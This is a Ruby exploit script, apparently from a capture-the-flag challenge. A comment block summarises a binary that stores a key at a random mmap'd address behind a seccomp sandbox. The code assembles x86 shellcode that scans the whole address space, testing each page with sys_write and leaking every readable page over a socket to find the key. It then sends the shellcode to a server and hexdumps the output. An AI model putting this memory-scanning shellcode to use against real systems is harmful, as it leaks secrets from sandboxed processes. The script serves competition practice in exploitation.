=begin

The challenge binary does the following:

  * Read key from json
  * Read array of "addrs" from json
  * Attempt mmap'ing memory at addr (randomly chosen) from array till success
  * Copy "pppp: key" to mmap'd memory
  * init seccomp sandbox
  * read exec shellcode

seccomp sandbox allowed sys calls:

sys_read
sys_write
sys_close
sys_access
sys_dup3
sys_fstat
sys_exit_group

We tried:

  * Leaking mutiple pages from stack identified by esp
    * Looking for mmap signatures to leak map addr
  * Using malloc to identify heap addr and leak data
    * Looking for json object signatures
    
  * Gave up and brute forced address space with sys_write based test for read

=end


$:.unshift("~/Tools/metasm")
require 'metasm'
require 'hexdump'
require 'socket'

def get_search_code()
%Q{
	nop

	#define SYS_write		4
	#define STDOUT			1
	#define STDERR			2
	#define START_ADDR	0
	#define END_ADDR		0xb0000000
	#define PAGE_SIZE		0x1000

	mov eax, START_ADDR
	mov ebx, END_ADDR

_writeSock:
	push ebx		; save
	push eax		; save

	; Test readability of page
	mov edx, 0x10
	mov ecx, eax
	mov ebx, STDERR
	mov eax, SYS_write
	int 0x80

	cmp eax, 0
	jle _doCont

	; Leak some data from the page
	mov edx, PAGE_SIZE
	mov ecx, dword ptr [esp]			; saved eax on stack
	mov ebx, STDOUT
	mov eax, SYS_write
	int 0x80

_doCont:
	pop eax						; restore
	pop ebx						; restore
	add eax, PAGE_SIZE
	cmp eax, ebx
	jb _writeSock			; unsigned comparison

	nop
	int 3
}
end

def tickle_server(scode)
	host = ARGV[0] || '127.0.0.1'
	port = (ARGV[1] || 8976).to_i

	raise "Shellcode too big" if scode.size > 0x80

	sock = TCPSocket.new(host, port)
	sock.recv(10000)	# banner
	sock.send(scode, 0)

	data = ''
	until (s = sock.recv(1000)).empty?
		$stderr.print "."
		data << s
	end

	return data
end

if __FILE__ == $0
	scode = Metasm::Shellcode.assemble(Metasm::Ia32.new, get_search_code()).encode_string()
	data = tickle_server(scode)
	Hexdump.dump(data)
end
